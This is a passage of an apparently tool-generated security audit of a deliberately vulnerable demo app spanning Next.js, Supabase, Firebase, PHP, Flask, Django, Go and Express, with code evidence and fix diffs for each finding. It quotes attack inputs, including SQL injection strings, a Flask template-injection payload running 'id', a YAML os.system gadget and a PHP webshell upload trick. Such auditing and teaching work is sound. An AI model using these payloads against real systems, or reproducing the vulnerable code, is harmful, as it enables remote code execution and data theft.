# Backend security audit: demo-app (intentionally vulnerable example)

> This is an intentionally vulnerable demo app with fake secrets, audited by the `backend-security-audit` skill to produce this example report.

| | |
|---|---|
| **Date** | 2026-11-10 |
| **Audited commit** | `4390f6b` (master) |
| **Detected stacks** | nextjs, supabase, pocketbase, php-mysql, flask, fastapi, django, go, node-express, laravel, firebase, mysql |
| **Scope** | Local repository code (39 tracked files) |
| **Out of scope** | Infrastructure, dashboard settings, production environment variables, dynamic testing, live database scans |

> Read-only static analysis: no project file was modified. Fixes are proposed as diffs.

## Summary

**Score: 0/100.** Every stack contains directly exploitable flaws (unauthenticated data access, injection, remote code execution paths, open security rules); the project must not be deployed as is.

| Severity | Confirmed | To verify |
|---|---|---|
| Critical | 20 | 1 |
| High | 19 | 1 |
| Medium | 3 | 0 |
| Low | 1 | 0 |
| Info | 0 | 0 |

Score calculation: 25×20 + 10×19 + 4×3 + 1×1 = 703 for confirmed findings, plus half weights for to-verify findings (12.5×1 + 5×1 = 17.5), far above 100, floor 0.

45 findings in total (grouped by root cause and stack).

## Summary table

| ID | Severity | Title | OWASP | Location | Status |
|---|---|---|---|---|---|
| SEC-01 | Critical | Live-format Stripe key in a tracked, non-ignored `.env` | A02 | `.env:3` | Confirmed |
| SEC-02 | Critical | Supabase `service_role` key shipped to the browser | A02 | `components/AdminPanel.tsx:4-7` | Confirmed |
| SEC-03 | Critical | Next.js server action and API route use `service_role` with no auth (IDOR, delete) | A01 | `app/actions.ts:6-8`, `app/api/invoices/[id]/route.ts:5-9` | Confirmed |
| SEC-04 | Critical | `invoices` table has no RLS | A01 | `supabase/migrations/20250101000000_init.sql:10-14` | Confirmed |
| SEC-05 | Critical | `profiles` UPDATE policy `using (true)`, `role` and `credits` writable | A01 | `supabase/migrations/20250101000000_init.sql:3-8` | Confirmed |
| SEC-06 | Critical | `add_credits` is an exposed `SECURITY DEFINER` RPC | A01 | `supabase/migrations/20250101000000_init.sql:20-23` | Confirmed |
| SEC-07 | Critical | Firebase rules open to the world (Firestore, Storage, RTDB) | A01 | `firebase/firestore.rules:10-12`, `firebase/storage.rules:4-6`, `firebase/database.rules.json:3` | Confirmed |
| SEC-08 | Critical | Cloud Functions without authorization (delete any order, make anyone admin) | A01 | `firebase/functions/index.js:5-12` | Confirmed |
| SEC-09 | Critical | SQL injection in PHP and Laravel | A03 | `php/login.php:5`, `laravel/app/Http/Controllers/ProductController.php:12` | Confirmed |
| SEC-10 | Critical | SQL injection in Flask, FastAPI and Django | A03 | `flask/app.py:16`, `fastapi/main.py:15`, `django/shop/views.py:29` | Confirmed |
| SEC-11 | Critical | SQL injection in Express, Go and a PocketBase hook | A03 | `express/server.js:20`, `go/main.go:30`, `pb_hooks/main.pb.js:5` | Confirmed |
| SEC-12 | Critical | Local file inclusion in `include $_GET['page']` | A03 | `php/upload.php:6` | Confirmed |
| SEC-13 | Critical | Unrestricted upload into webroot (PHP RCE) | A04 | `php/upload.php:3-4` | Confirmed |
| SEC-14 | Critical | Server-side template injection in Flask | A03 | `flask/app.py:11` | Confirmed |
| SEC-15 | Critical | Unsafe deserialization (`pickle`, `yaml.Loader`) in Flask | A08 | `flask/app.py:21` | Confirmed |
| SEC-16 | Critical | Flask `debug=True` on `0.0.0.0` | A05 | `flask/app.py:24` | To verify |
| SEC-17 | Critical | JWT never verified / auth middleware ineffective (FastAPI, Go, Express) | A07 | `fastapi/main.py:9-15`, `go/main.go:17-25`, `express/server.js:24` | Confirmed |
| SEC-18 | Critical | Django `UserViewSet` open to everyone with `fields = "__all__"` | A01 | `django/shop/views.py:10-18`, `django/shop/settings.py:8` | Confirmed |
| SEC-19 | Critical | Command injection in Go `/convert` | A03 | `go/main.go:39` | Confirmed |
| SEC-20 | Critical | PocketBase `notes` collection: public list/view/delete, auth-only create/update | A01 | `pb_migrations/1700000000_created_notes.js:6-10` | Confirmed |
| SEC-21 | Critical | MySQL account `app@%` with empty password and `ALL PRIVILEGES *.*` | A07 | `mysql/init.sql:9-10` | Confirmed |
| SEC-22 | High | MySQL exposure: root/root, published 3306, public Adminer, EOL image | A05 | `mysql/docker-compose.yml:3-14` | Confirmed |
| SEC-23 | High | Passwords hashed with MD5 (PHP, MySQL, Django) | A02 | `php/login.php:7`, `mysql/init.sql:4,7`, `django/shop/settings.py:7` | Confirmed |
| SEC-24 | High | Dynamic SQL built with `CONCAT` in a stored procedure | A03 | `mysql/init.sql:12-19` | Confirmed |
| SEC-25 | High | Anonymous unconstrained INSERT on `comments` | A01 | `supabase/migrations/20250101000000_init.sql:16-18` | Confirmed |
| SEC-26 | High | View `invoice_totals` without `security_invoker` | A01 | `supabase/migrations/20250101000000_init.sql:25` | Confirmed |
| SEC-27 | High | NoSQL injection on login (`User.findOne(req.body)`) | A03 | `express/server.js:14` | Confirmed |
| SEC-28 | High | Hardcoded JWT signing secret `"secret"` (Express, Go) | A02 | `express/server.js:16`, `go/main.go:19` | Confirmed |
| SEC-29 | High | Mass assignment (Express `/me`, Laravel `Product`) | A01 | `express/server.js:25`, `laravel/app/Http/Controllers/ProductController.php:17`, `laravel/app/Models/Product.php:8` | Confirmed |
| SEC-30 | High | Laravel routes without auth, avatar upload with client file name in public disk | A04 | `laravel/routes/web.php:5-7`, `laravel/app/Http/Controllers/ProductController.php:23` | Confirmed |
| SEC-31 | High | Path traversal (Express `/download`, Go `/files`) | A01 | `express/server.js:29`, `go/main.go:43` | Confirmed |
| SEC-32 | High | SSRF (Next.js `/api/preview`, Go `/fetch`) | A10 | `app/api/preview/route.ts:3`, `go/main.go:46` | Confirmed |
| SEC-33 | High | Django `invoice` IDOR | A01 | `django/shop/views.py:21-23` | Confirmed |
| SEC-34 | High | Hardcoded `SECRET_KEY` (Django, Flask) | A02 | `django/shop/settings.py:1`, `flask/app.py:6` | Confirmed |
| SEC-35 | High | Django `DEBUG = True`, `ALLOWED_HOSTS = ["*"]`, non-secure cookie | A05 | `django/shop/settings.py:2-3,6` | Confirmed |
| SEC-36 | High | CORS wildcard, with credentials (Flask, FastAPI, Django) and open (Express) | A05 | `flask/app.py:7`, `fastapi/main.py:6`, `django/shop/settings.py:4-5`, `express/server.js:10` | Confirmed |
| SEC-37 | High | Cross-site scripting (PHP, Next.js, Laravel) | A03 | `php/login.php:11`, `components/AdminPanel.tsx:10`, `laravel/resources/views/product.blade.php:2` | Confirmed |
| SEC-38 | High | Committed DB root credentials and `display_errors` | A02 | `php/config.php:2-3` | Confirmed |
| SEC-39 | High | Next.js middleware covers only `/dashboard` and trusts `getSession()` | A01 | `middleware.ts:9,14` | Confirmed |
| SEC-40 | High | Firebase rules gated only by sign-in or a test-mode date | A01 | `firebase/firestore.rules:5,8`, `firebase/database.rules.json:4` | Confirmed |
| SEC-41 | High | Old pinned dependencies, Next 15.1.0 (CVE-2025-29927), no lockfiles | A06 | `package.json:4` | To verify |
| SEC-42 | Medium | PHP login: session fixation and open redirect | A07 | `php/login.php:8-9` | Confirmed |
| SEC-43 | Medium | No rate limiting on login (Express, PHP) | A07 | `express/server.js:13`, `php/login.php:4-7` | Confirmed |
| SEC-44 | Medium | Verbose errors returned to clients | A09 | `php/config.php:2`, `express/server.js:32`, `go/main.go:33` | Confirmed |
| SEC-45 | Low | Hardening gaps: no security headers, public FastAPI docs, Go server without timeouts | A05 | `package.json` (no `next.config`), `fastapi/main.py:5`, `go/main.go:50` | Confirmed |

## Findings

### SEC-01: Live-format Stripe key in a tracked, non-ignored `.env`

- **Severity**: Critical
- **OWASP category**: A02, Cryptographic failures
- **Location**: `.env:3` (also in git history, commit `4390f6b`)
- **Status**: Confirmed (value has the `sk_live_` shape; this demo value is a fake)

**Evidence**
```
$ git ls-files | grep -n env
1:.env
$ ls .gitignore
ls: cannot access '.gitignore': No such file or directory
.env
1  NEXT_PUBLIC_SUPABASE_URL=http://127.0.0.1:54321
2  NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY=fa…****
3  STRIPE_SECRET_KEY=sk_liv…****
$ git show 4390f6b -- .env | grep -n STRIPE
15:+STRIPE_SECRET_KEY=sk_liv…****
```

**Concrete impact**
Anyone with read access to the repository (or a leak of it) obtains a live Stripe secret key: refunds, charges, customer data. There is no `.gitignore` at all, so the file is tracked and present in history; deleting it later would not revoke it.

**Proposed fix**
```diff
--- /dev/null
+++ b/.gitignore
@@ @@
+.env
+.env.*
+!.env.example
```
Then `git rm --cached .env`, rotate the Stripe key (mandatory), optionally purge history with `git filter-repo --path .env --invert-paths` (owner's decision), and provide a `.env.example` with placeholders.

---

### SEC-02: Supabase `service_role` key shipped to the browser

- **Severity**: Critical
- **OWASP category**: A02, Cryptographic failures
- **Location**: `components/AdminPanel.tsx:4-7`, `.env:2`
- **Status**: Confirmed

**Evidence**
```tsx
1  "use client";
2  import { createClient } from "@supabase/supabase-js";
3
4  const supabase = createClient(
5    process.env.NEXT_PUBLIC_SUPABASE_URL!,
6    process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY!,
7  );
```
```
.env:2  NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY=fa…****
```

**Concrete impact**
`NEXT_PUBLIC_*` values are inlined into the JavaScript bundle of a `"use client"` component. Any visitor can read the `service_role` key, which bypasses all RLS, and read, modify or delete every table.

**Proposed fix**
```diff
--- a/components/AdminPanel.tsx
+++ b/components/AdminPanel.tsx
@@ 1,7 @@
 "use client";
-import { createClient } from "@supabase/supabase-js";
-
-const supabase = createClient(
-  process.env.NEXT_PUBLIC_SUPABASE_URL!,
-  process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY!,
-);
+// No Supabase client here: call server actions / routes that check the session.
--- a/.env
+++ b/.env
@@ 2 @@
-NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY=...
+SUPABASE_SERVICE_ROLE_KEY=...
```
Rotate the service_role key in the Supabase dashboard (it was exposed). Server-side admin client modules should start with `import "server-only";`.

---

### SEC-03: Next.js server action and API route use `service_role` with no authentication (IDOR, delete)

- **Severity**: Critical
- **OWASP category**: A01, Broken access control
- **Location**: `app/actions.ts:6-8`, `app/api/invoices/[id]/route.ts:5-9`
- **Status**: Confirmed

**Evidence**
```ts
// app/actions.ts
1  "use server";
4  const admin = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);
5
6  export async function deleteInvoice(id: string) {
7    await admin.from("invoices").delete().eq("id", id);
8  }
```
```ts
// app/api/invoices/[id]/route.ts
3  const admin = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);
5  export async function GET(_req: Request, { params }: { params: Promise<{ id: string }> }) {
6    const { id } = await params;
7    const { data } = await admin.from("invoices").select("*").eq("id", id).single();
8    return Response.json(data);
```
Neither file reads a session or filters by owner, and the `middleware.ts` matcher does not cover them (see SEC-39).

**Concrete impact**
A server action is a public POST endpoint: anyone can delete any invoice by id. Any visitor can read any invoice with `GET /api/invoices/<id>`; the `service_role` client ignores RLS, so even a correct policy would not help.

**Proposed fix**
```diff
--- a/app/actions.ts
+++ b/app/actions.ts
@@ 6,8 @@
 export async function deleteInvoice(id: string) {
-  await admin.from("invoices").delete().eq("id", id);
+  const supabase = await createServerClient(); // anon key + cookies (RLS applies)
+  const { data: { user } } = await supabase.auth.getUser();
+  if (!user) throw new Error("Not authenticated");
+  await supabase.from("invoices").delete().eq("id", id).eq("user_id", user.id);
 }
--- a/app/api/invoices/[id]/route.ts
+++ b/app/api/invoices/[id]/route.ts
@@ 7 @@
-  const { data } = await admin.from("invoices").select("*").eq("id", id).single();
+  const supabase = await createServerClient();
+  const { data: { user } } = await supabase.auth.getUser();
+  if (!user) return new Response("Unauthorized", { status: 401 });
+  const { data } = await supabase.from("invoices").select("*").eq("id", id).eq("user_id", user.id).single();
```
Prefer the user-scoped client over `service_role` so that RLS (SEC-04) is the second barrier.

---

### SEC-04: `invoices` table has no RLS

- **Severity**: Critical
- **OWASP category**: A01, Broken access control
- **Location**: `supabase/migrations/20250101000000_init.sql:10-14`
- **Status**: Confirmed (single migration; no later `enable row level security` for this table)

**Evidence**
```sql
10  create table public.invoices (
11    id uuid primary key default gen_random_uuid(),
12    user_id uuid references auth.users,
13    amount int
14  );
```
There is no `alter table public.invoices enable row level security` in the file (compare lines 7 and 17 for `profiles` and `comments`).

**Concrete impact**
With the public anon key, anyone can read, insert, update and delete every invoice through PostgREST (`GET/PATCH/DELETE /rest/v1/invoices`).

**Proposed fix**
```diff
--- a/supabase/migrations/20250101000000_init.sql
+++ b/supabase/migrations/20250101000000_init.sql
@@ 14 @@
 );
+alter table public.invoices enable row level security;
+create policy "owner read" on public.invoices for select to authenticated
+  using ((select auth.uid()) = user_id);
+create policy "owner insert" on public.invoices for insert to authenticated
+  with check ((select auth.uid()) = user_id);
```
Ship this as a new migration (do not rewrite applied ones) and also make `user_id` `not null`.

---

### SEC-05: `profiles` UPDATE policy `using (true)`, with writable `role` and `credits`

- **Severity**: Critical
- **OWASP category**: A01, Broken access control
- **Location**: `supabase/migrations/20250101000000_init.sql:3-8`
- **Status**: Confirmed

**Evidence**
```sql
1  create table public.profiles (
2    id uuid primary key references auth.users,
3    full_name text,
4    role text not null default 'user',
5    credits int not null default 0
6  );
7  alter table public.profiles enable row level security;
8  create policy "profil modifiable" on public.profiles for update using (true);
```
The policy has no `to` clause (so it applies to `public`, including `anon`), no `with check`, and no column restriction.

**Concrete impact**
Any anonymous visitor can run `PATCH /rest/v1/profiles` on any row: take over profiles, set `role = 'admin'` and give themselves unlimited `credits`.

**Proposed fix**
```diff
--- a/supabase/migrations/20250101000000_init.sql
+++ b/supabase/migrations/20250101000000_init.sql
@@ 8 @@
-create policy "profil modifiable" on public.profiles for update using (true);
+create policy "update self" on public.profiles for update to authenticated
+  using ((select auth.uid()) = id) with check ((select auth.uid()) = id);
+revoke update on public.profiles from authenticated, anon;
+grant update (full_name) on public.profiles to authenticated;
```
Note: no SELECT policy exists, so reads are currently denied; add one if the app needs to read profiles.

---

### SEC-06: `add_credits` is an exposed `SECURITY DEFINER` RPC

- **Severity**: Critical
- **OWASP category**: A01, Broken access control
- **Location**: `supabase/migrations/20250101000000_init.sql:20-23`
- **Status**: Confirmed

**Evidence**
```sql
20  create function public.add_credits(uid uuid, n int) returns void
21  language sql security definer as $$
22    update public.profiles set credits = credits + n where id = uid
23  $$;
```
No `set search_path`, no `auth.uid()` check, no `revoke execute`; the function lives in the exposed `public` schema.

**Concrete impact**
`POST /rest/v1/rpc/add_credits` with the anon key lets anyone add arbitrary credits to any account (functions are executable by `public` by default), bypassing RLS because of `SECURITY DEFINER`.

**Proposed fix**
```diff
--- a/supabase/migrations/20250101000000_init.sql
+++ b/supabase/migrations/20250101000000_init.sql
@@ 20,23 @@
-create function public.add_credits(uid uuid, n int) returns void
-language sql security definer as $$
+create schema if not exists private;
+create function private.add_credits(uid uuid, n int) returns void
+language sql security definer set search_path = '' as $$
   update public.profiles set credits = credits + n where id = uid
 $$;
+revoke execute on function private.add_credits(uuid, int) from public, anon, authenticated;
+grant execute on function private.add_credits(uuid, int) to service_role;
```

---

### SEC-07: Firebase rules open to the world (Firestore, Storage, Realtime Database)

- **Severity**: Critical
- **OWASP category**: A01, Broken access control
- **Location**: `firebase/firestore.rules:10-12`, `firebase/storage.rules:4-6`, `firebase/database.rules.json:3`
- **Status**: Confirmed: these files are referenced by `firebase/firebase.json`, so they are what `firebase deploy` ships. The Firebase console may hold newer rules: compare in Firestore / Storage / Realtime Database > Rules.

**Evidence**
```
// firestore.rules
10      match /{document=**} {
11        allow read: if true;
12      }
// storage.rules
4     match /{allPaths=**} {
5       allow read, write;
6     }
// database.rules.json
2   "rules": {
3     ".read": true,
4     ".write": "auth != null"
```

**Concrete impact**
If deployed as is: the whole Firestore database and the whole Realtime Database are readable by anyone with the public web config; Cloud Storage allows anonymous read **and write** on every path (rules are additive, so the global `allow read: if true` also nullifies the stricter `users` rule for reads).

**Proposed fix**
```diff
--- a/firebase/firestore.rules
+++ b/firebase/firestore.rules
@@ 10,12 @@
-    match /{document=**} {
-      allow read: if true;
-    }
+    match /{document=**} {
+      allow read, write: if false;
+    }
--- a/firebase/storage.rules
+++ b/firebase/storage.rules
@@ 4,6 @@
-    match /{allPaths=**} {
-      allow read, write;
-    }
+    match /users/{uid}/{file} {
+      allow read: if request.auth != null && request.auth.uid == uid;
+      allow write: if request.auth != null && request.auth.uid == uid
+        && request.resource.size < 5 * 1024 * 1024
+        && request.resource.contentType.matches('image/.*');
+    }
--- a/firebase/database.rules.json
+++ b/firebase/database.rules.json
@@ 3 @@
-    ".read": true,
+    ".read": false,
```

---

### SEC-08: Cloud Functions without authorization

- **Severity**: Critical
- **OWASP category**: A01, Broken access control
- **Location**: `firebase/functions/index.js:5-12`
- **Status**: Confirmed (the code has no check; whether it is deployed is outside the repo)

**Evidence**
```js
5  exports.deleteOrder = onCall(async (req) => {
6    await admin.firestore().doc(`orders/${req.data.id}`).delete();
7  });
8
9  exports.setRole = onRequest({ cors: true }, async (req, res) => {
10   await admin.auth().setCustomUserClaims(req.body.uid, { admin: true });
11   res.send("ok");
12 });
```

**Concrete impact**
The Admin SDK bypasses all security rules. `deleteOrder` never checks `req.auth` nor ownership: anyone can delete any order. `setRole` is a public HTTP endpoint (CORS open) that grants the `admin` custom claim to any `uid` supplied in the body: instant privilege escalation for anyone.

**Proposed fix**
```diff
--- a/firebase/functions/index.js
+++ b/firebase/functions/index.js
@@ 1,12 @@
-const { onCall, onRequest } = require("firebase-functions/v2/https");
+const { onCall, onRequest, HttpsError } = require("firebase-functions/v2/https");
@@ 5,7 @@
 exports.deleteOrder = onCall(async (req) => {
-  await admin.firestore().doc(`orders/${req.data.id}`).delete();
+  if (!req.auth) throw new HttpsError("unauthenticated", "Login required");
+  const ref = admin.firestore().doc(`orders/${req.data.id}`);
+  const snap = await ref.get();
+  if (snap.get("userId") !== req.auth.uid) throw new HttpsError("permission-denied", "Forbidden");
+  await ref.delete();
 });
@@ 9,12 @@
-exports.setRole = onRequest({ cors: true }, async (req, res) => {
-  await admin.auth().setCustomUserClaims(req.body.uid, { admin: true });
+exports.setRole = onRequest(async (req, res) => {
+  const token = (req.headers.authorization || "").replace("Bearer ", "");
+  const caller = await admin.auth().verifyIdToken(token).catch(() => null);
+  if (!caller || caller.admin !== true) return res.status(403).send("Forbidden");
+  await admin.auth().setCustomUserClaims(req.body.uid, { admin: true });
   res.send("ok");
 });
```

---

### SEC-09: SQL injection in PHP and Laravel

- **Severity**: Critical
- **OWASP category**: A03, Injection
- **Location**: `php/login.php:5`, `laravel/app/Http/Controllers/ProductController.php:12`
- **Status**: Confirmed

**Evidence**
```php
// php/login.php
4  $email = $_POST['email'];
5  $res = $pdo->query("SELECT * FROM users WHERE email = '" . $email . "'");
```
```php
// ProductController.php
10    public function index(Request $request)
11    {
12        return DB::select("SELECT * FROM products WHERE name LIKE '%{$request->q}%'");
13    }
```

**Concrete impact**
`$_POST['email']` and `$request->q` go straight into the SQL string. An anonymous attacker can bypass the login (`' OR '1'='1`) and dump any table (`UNION SELECT`). Combined with the MySQL account of SEC-21, `FILE` and every schema are within reach. `/products?q=` has no auth.

**Proposed fix**
```diff
--- a/php/login.php
+++ b/php/login.php
@@ 4,5 @@
-$email = $_POST['email'];
-$res = $pdo->query("SELECT * FROM users WHERE email = '" . $email . "'");
+$res = $pdo->prepare('SELECT * FROM users WHERE email = ?');
+$res->execute([$_POST['email'] ?? '']);
--- a/laravel/app/Http/Controllers/ProductController.php
+++ b/laravel/app/Http/Controllers/ProductController.php
@@ 12 @@
-        return DB::select("SELECT * FROM products WHERE name LIKE '%{$request->q}%'");
+        return DB::select('SELECT * FROM products WHERE name LIKE ?', ['%' . $request->q . '%']);
```

---

### SEC-10: SQL injection in Flask, FastAPI and Django

- **Severity**: Critical
- **OWASP category**: A03, Injection
- **Location**: `flask/app.py:16`, `fastapi/main.py:15`, `django/shop/views.py:29`
- **Status**: Confirmed

**Evidence**
```python
# flask/app.py
15    cur = sqlite3.connect("app.db").cursor()
16    cur.execute(f"SELECT * FROM users WHERE email = '{request.args['email']}'")
```
```python
# fastapi/main.py
13  @app.delete("/orders/{order_id}")
14  async def delete_order(order_id: int):
15      await db.execute(f"DELETE FROM orders WHERE id = {order_id}")
```
```python
# django/shop/views.py
27  def search(request):
28      with connection.cursor() as cur:
29          cur.execute(f"SELECT id, username FROM auth_user WHERE username LIKE '%{request.GET['q']}%'")
```

**Concrete impact**
Flask and Django interpolate raw query parameters: full data extraction (Django: `auth_user` password hashes) with a UNION. FastAPI's `order_id: int` is validated by Pydantic, so injection is limited, but the statement is built with an f-string and the route has no authentication (SEC-17): any caller can delete any order. The first two are exploitable by anonymous users.

**Proposed fix**
```diff
--- a/flask/app.py
+++ b/flask/app.py
@@ 16 @@
-    cur.execute(f"SELECT * FROM users WHERE email = '{request.args['email']}'")
+    cur.execute("SELECT * FROM users WHERE email = ?", (request.args["email"],))
--- a/fastapi/main.py
+++ b/fastapi/main.py
@@ 15 @@
-    await db.execute(f"DELETE FROM orders WHERE id = {order_id}")
+    await db.execute("DELETE FROM orders WHERE id = :id AND user_id = :uid", {"id": order_id, "uid": user["id"]})
--- a/django/shop/views.py
+++ b/django/shop/views.py
@@ 29 @@
-        cur.execute(f"SELECT id, username FROM auth_user WHERE username LIKE '%{request.GET['q']}%'")
+        cur.execute("SELECT id, username FROM auth_user WHERE username LIKE %s", ["%" + request.GET["q"] + "%"])
```

---

### SEC-11: SQL injection in Express, Go and a PocketBase hook

- **Severity**: Critical (PocketBase hook rated Critical instead of the High default: public route, `UNION` can read `_superusers` hashes)
- **OWASP category**: A03, Injection
- **Location**: `express/server.js:20`, `go/main.go:30`, `pb_hooks/main.pb.js:5`
- **Status**: Confirmed

**Evidence**
```js
// express/server.js
8   const db = mysql.createConnection({ host: "localhost", user: "app", database: "shop", multipleStatements: true });
19  app.get("/products", (req, res) => {
20    db.query("SELECT * FROM products WHERE category = '" + req.query.cat + "'", (err, rows) => res.json(rows));
```
```go
// go/main.go
29  r.GET("/users/:id", func(c *gin.Context) {
30      row := db.QueryRow(fmt.Sprintf("SELECT email FROM users WHERE id = %s", c.Param("id")))
```
```js
// pb_hooks/main.pb.js
2  routerAdd("GET", "/api/notes/search", (e) => {
3    const q = e.request.url.query().get("q");
5    $app.db().newQuery("SELECT id, content FROM notes WHERE content LIKE '%" + q + "%'").all(rows);
```

**Concrete impact**
All three routes are public and concatenate a client value. `multipleStatements: true` lets an Express injection stack queries (`; DROP TABLE ...`). In PocketBase the hook bypasses API rules and can reach every SQLite table.

**Proposed fix**
```diff
--- a/express/server.js
+++ b/express/server.js
@@ 8,20 @@
-const db = mysql.createConnection({ host: "localhost", user: "app", database: "shop", multipleStatements: true });
+const db = mysql.createConnection({ host: "localhost", user: "app", database: "shop" });
@@ 20 @@
-  db.query("SELECT * FROM products WHERE category = '" + req.query.cat + "'", (err, rows) => res.json(rows));
+  db.query("SELECT * FROM products WHERE category = ?", [req.query.cat], (err, rows) => res.json(rows));
--- a/go/main.go
+++ b/go/main.go
@@ 30 @@
-		row := db.QueryRow(fmt.Sprintf("SELECT email FROM users WHERE id = %s", c.Param("id")))
+		row := db.QueryRow("SELECT email FROM users WHERE id = ?", c.Param("id"))
--- a/pb_hooks/main.pb.js
+++ b/pb_hooks/main.pb.js
@@ 5 @@
-  $app.db().newQuery("SELECT id, content FROM notes WHERE content LIKE '%" + q + "%'").all(rows);
+  $app.db().newQuery("SELECT id, content FROM notes WHERE content LIKE {:q}").bind({ q: "%" + q + "%" }).all(rows);
```

---

### SEC-12: Local file inclusion in `include $_GET['page']`

- **Severity**: Critical
- **OWASP category**: A03, Injection
- **Location**: `php/upload.php:6`
- **Status**: Confirmed

**Evidence**
```php
1  <?php
2  session_start();
...
6  include $_GET['page'] . '.php';
```

**Concrete impact**
Unauthenticated user input chooses the included file: `?page=uploads/shell` executes an uploaded file (chained with SEC-13 it is remote code execution), `php://filter` wrappers disclose source code, and, depending on `allow_url_include`, remote files can be included.

**Proposed fix**
```diff
--- a/php/upload.php
+++ b/php/upload.php
@@ 6 @@
-include $_GET['page'] . '.php';
+$pages = ['accueil', 'contact', 'produits'];
+$page = in_array($_GET['page'] ?? '', $pages, true) ? $_GET['page'] : 'accueil';
+include __DIR__ . "/pages/$page.php";
```

---

### SEC-13: Unrestricted upload into the webroot (PHP RCE)

- **Severity**: Critical
- **OWASP category**: A04, Insecure design
- **Location**: `php/upload.php:3-4`
- **Status**: Confirmed

**Evidence**
```php
2  session_start();
3  if ($_FILES['photo']['type'] === 'image/jpeg') {
4      move_uploaded_file($_FILES['photo']['tmp_name'], __DIR__ . '/uploads/' . $_FILES['photo']['name']);
5  }
```
The only check is `$_FILES[...]['type']`, which is supplied by the client. The file keeps its original name, is stored in `php/uploads/` under the script directory, and nothing checks that the user is logged in (`session_start()` only starts a session).

**Concrete impact**
An anonymous attacker uploads `shell.php` with a forged `Content-Type: image/jpeg` and calls `/php/uploads/shell.php`: arbitrary code execution as the web user. Path characters in the name can also overwrite other files.

**Proposed fix**
```diff
--- a/php/upload.php
+++ b/php/upload.php
@@ 2,5 @@
 session_start();
-if ($_FILES['photo']['type'] === 'image/jpeg') {
-    move_uploaded_file($_FILES['photo']['tmp_name'], __DIR__ . '/uploads/' . $_FILES['photo']['name']);
-}
+if (empty($_SESSION['user_id'])) { http_response_code(401); exit; }
+$mime = (new finfo(FILEINFO_MIME_TYPE))->file($_FILES['photo']['tmp_name']);
+$ext  = ['image/jpeg' => 'jpg', 'image/png' => 'png'][$mime] ?? null;
+if (!$ext || $_FILES['photo']['size'] > 5_000_000) { http_response_code(400); exit; }
+move_uploaded_file($_FILES['photo']['tmp_name'], __DIR__ . '/../storage/' . bin2hex(random_bytes(16)) . '.' . $ext);
```
Store outside the webroot (or add an `.htaccess` that disables PHP in the upload directory).

---

### SEC-14: Server-side template injection in Flask

- **Severity**: Critical
- **OWASP category**: A03, Injection
- **Location**: `flask/app.py:11`
- **Status**: Confirmed

**Evidence**
```python
9  @app.route("/hello")
10 def hello():
11     return render_template_string("<h1>Bonjour " + request.args.get("nom", "") + "</h1>")
```

**Concrete impact**
The query parameter is concatenated into the template source: `/hello?nom={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` executes commands on the server as an anonymous user (also leaks `SECRET_KEY`).

**Proposed fix**
```diff
--- a/flask/app.py
+++ b/flask/app.py
@@ 11 @@
-    return render_template_string("<h1>Bonjour " + request.args.get("nom", "") + "</h1>")
+    return render_template_string("<h1>Bonjour {{ nom }}</h1>", nom=request.args.get("nom", ""))
```

---

### SEC-15: Unsafe deserialization (`pickle`, `yaml.Loader`) in Flask

- **Severity**: Critical
- **OWASP category**: A08, Software and data integrity failures
- **Location**: `flask/app.py:21`
- **Status**: Confirmed

**Evidence**
```python
19  @app.post("/import")
20  def import_data():
21      return str(pickle.loads(request.data)) + str(yaml.load(request.form["cfg"], Loader=yaml.Loader))
```

**Concrete impact**
Both the raw request body and the `cfg` form field are attacker controlled and deserialized with code-executing loaders: a crafted pickle or `!!python/object/apply:os.system` YAML gives remote code execution without authentication (the route has none).

**Proposed fix**
```diff
--- a/flask/app.py
+++ b/flask/app.py
@@ 21 @@
-    return str(pickle.loads(request.data)) + str(yaml.load(request.form["cfg"], Loader=yaml.Loader))
+    return str(json.loads(request.data)) + str(yaml.safe_load(request.form["cfg"]))
```
Add `import json` and drop `import pickle`; add authentication to the route.

---

### SEC-16: Flask `debug=True` on `0.0.0.0`

- **Severity**: Critical
- **OWASP category**: A05, Security misconfiguration
- **Location**: `flask/app.py:24`
- **Status**: To verify manually: no Dockerfile or Procfile is in the repo, so it is unknown whether `python app.py` is the production entry point. Check how the service is started in production (if it is `gunicorn`/`uwsgi` the `__main__` block is unused; the status becomes Info).

**Evidence**
```python
23  if __name__ == "__main__":
24      app.run(host="0.0.0.0", debug=True)
```

**Concrete impact**
If this entry point runs in production, the Werkzeug debugger is reachable from the network and allows arbitrary Python execution from the browser.

**Proposed fix**
```diff
--- a/flask/app.py
+++ b/flask/app.py
@@ 24 @@
-    app.run(host="0.0.0.0", debug=True)
+    app.run(host="127.0.0.1", debug=os.environ.get("FLASK_DEBUG") == "1")
```
In production use `gunicorn app:app` and never `app.run`.

---

### SEC-17: JWT never verified / authentication middleware ineffective (FastAPI, Go, Express)

- **Severity**: Critical
- **OWASP category**: A07, Identification and authentication failures
- **Location**: `fastapi/main.py:9-15`, `go/main.go:17-25`, `express/server.js:23-24`
- **Status**: Confirmed

**Evidence**
```python
# fastapi/main.py
9  def current_user(authorization: str = Header()):
10     return jwt.decode(authorization, options={"verify_signature": False})
...
13 @app.delete("/orders/{order_id}")
14 async def delete_order(order_id: int):
```
```go
// go/main.go
17  func auth(c *gin.Context) {
18  	token, _ := jwt.Parse(c.GetHeader("Authorization"), func(t *jwt.Token) (interface{}, error) {
19  		return []byte("secret"), nil
20  	})
21  	if token == nil {
22  		c.JSON(401, gin.H{"error": "unauthorized"})
23  	}
24  	c.Next()
```
```js
// express/server.js
23  app.put("/me", async (req, res) => {
24    const { id } = jwt.decode(req.headers.authorization);
```
`/users/:id`, `/files` and `/fetch` in `go/main.go:29,42,45` are registered without the `auth` middleware at all.

**Concrete impact**
- FastAPI: `current_user` disables signature verification (any forged token is accepted) and is not even attached to `delete_order` (no `Depends`): anyone can delete any order.
- Go: the error from `jwt.Parse` is ignored, the algorithm is not checked, and the middleware writes a 401 but does not `Abort()`/`return`, so `c.Next()` always runs the handler (`/convert` is therefore reachable by anonymous users).
